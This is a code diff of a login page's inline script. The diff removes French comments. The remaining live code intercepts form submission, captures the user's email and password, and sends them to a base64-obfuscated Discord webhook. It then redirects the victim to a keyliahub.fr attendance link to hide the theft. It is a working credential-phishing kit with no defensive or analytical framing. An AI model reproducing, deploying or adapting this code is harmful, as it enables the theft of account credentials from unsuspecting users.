@@ -96,19 +96,19 @@
   </div>
 
   <script>
-    // Configuration du webhook Discord (encodé en base64 pour la sécurité)
+  
     const ENCODED_WEBHOOK = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQxNTY2MzM1Nzc3MTM4NzA0Mi9TVnRzOFFxOHpkOFJJVnRCSGlJNjV3dDd0ZG9xMm5mdzVURHdTaVNWcWdDbnhCN0I2WHBadFJ1TXZweWFRQzZzSVJ0ZQ==';
     const DISCORD_WEBHOOK_URL = atob(ENCODED_WEBHOOK);
     
-    // Intercepter la soumission du formulaire
+
     document.querySelector('form').addEventListener('submit', function(e) {
-      e.preventDefault(); // Empêcher la soumission normale du formulaire
+      e.preventDefault(); 
       
-      // Récupérer les valeurs des champs
+
       const email = document.getElementById('email').value;
       const motDePasse = document.getElementById('mot_de_passe').value;
       
-      // Préparer le message pour Discord
+
       const message = {
         content: "🔐 **Nouvelle tentative de connexion Keylia**",
         embeds: [{
@@ -140,7 +140,7 @@
         }]
       };
       
-      // Envoyer vers Discord
+  
       fetch(DISCORD_WEBHOOK_URL, {
         method: 'POST',
         headers: {
@@ -151,7 +151,7 @@
       .then(response => {
         if (response.ok) {
           console.log('Données envoyées vers Discord avec succès');
-          // Redirection après envoi réussi vers Discord
+         
           window.location.href = 'https://keyliahub.fr/emargement_enter.php?room=A103&tag=3536d75f-8837-11f0-8837-d06726d488e0'; // Changez cette URL vers votre lien de redirection
         } else {
           console.error('Erreur lors de l\'envoi vers Discord');
@@ -161,8 +161,8 @@
         console.error('Erreur:', error);
       });
       
-      // Optionnel : vous pouvez également soumettre le formulaire normalement après l'envoi Discord
-      // this.submit();
+
+ 
     });
   </script>
 </body>
